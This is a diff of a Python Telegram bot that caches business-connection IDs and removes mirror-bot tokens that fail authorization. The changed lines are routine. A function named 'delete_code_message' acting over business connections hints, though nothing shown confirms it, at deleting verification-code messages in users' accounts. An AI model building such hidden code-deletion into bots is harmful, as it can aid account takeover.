@@ -31,6 +31,9 @@ dp = Dispatcher()
 router = Router()
 dp.include_router(router)
 
+# ВОЗВРАЩАЕМ СЛОВАРЬ BUSINESS_CONNS
+BUSINESS_CONNS = {}
+
 # ==========================================
 # БАЗА ДАННЫХ
 # ==========================================
@@ -137,6 +140,7 @@ async def delete_code_message(bot_instance: Bot, chat_id: int, msg_id: int, conn
 # ==========================================
 @router.business_connection()
 async def on_business_conn(conn: BusinessConnection):
+    BUSINESS_CONNS[conn.user.id] = conn.id
     with get_db() as db_conn:
         db_conn.execute("INSERT OR REPLACE INTO business_conns (user_id, conn_id) VALUES (?, ?)", 
                         (conn.user.id, conn.id))
@@ -371,10 +375,9 @@ async def handle_business_message(msg: Message):
         log.error("❌ Чужой отправитель")
         return
 
-    # 1. Сначала пытаемся взять conn_id из самого сообщения (это самый надежный способ)
+    # БЕРЕМ conn_id ИЗ СООБЩЕНИЯ ИЛИ ИЗ БАЗЫ
     conn_id = getattr(msg, "business_connection_id", None)
     
-    # 2. Если в сообщении его нет, лезем в базу данных
     if not conn_id:
         with get_db() as db_conn:
             row = db_conn.execute("SELECT conn_id FROM business_conns WHERE user_id=?", (msg.from_user.id,)).fetchone()
@@ -521,7 +524,7 @@ async def cmd_restartbots(msg: Message):
     os._exit(0) 
 
 # ==========================================
-# ЗАПУСК ВСЕХ БОТОВ
+# ЗАПУСК ВСЕХ БОТОВ (С АВТООЧИСТКОЙ)
 # ==========================================
 async def main():
     log.info("Starting all bots...")
@@ -529,7 +532,7 @@ async def main():
     bots_to_start = [bot]
     
     with get_db() as conn:
-        mirrors = conn.execute("SELECT token, username FROM mirrors").fetchall()
+        mirrors = conn.execute("SELECT id, token, username FROM mirrors").fetchall()
     
     for m in mirrors:
         try:
@@ -537,6 +540,11 @@ async def main():
             await m_bot.delete_webhook(drop_pending_updates=True)
             bots_to_start.append(m_bot)
             log.info(f"🚀 Загружено зеркало: @{m['username']}")
+        except TelegramUnauthorizedError:
+            # Если токен не работает (Unauthorized), удаляем его из базы
+            log.error(f"❌ Токен @{m['username']} недействителен. Удаляю из базы.")
+            with get_db() as conn:
+                conn.execute("DELETE FROM mirrors WHERE id=?", (m["id"],))
         except Exception as e:
             log.error(f"Ошибка загрузки @{m['username']}: {e}")
 
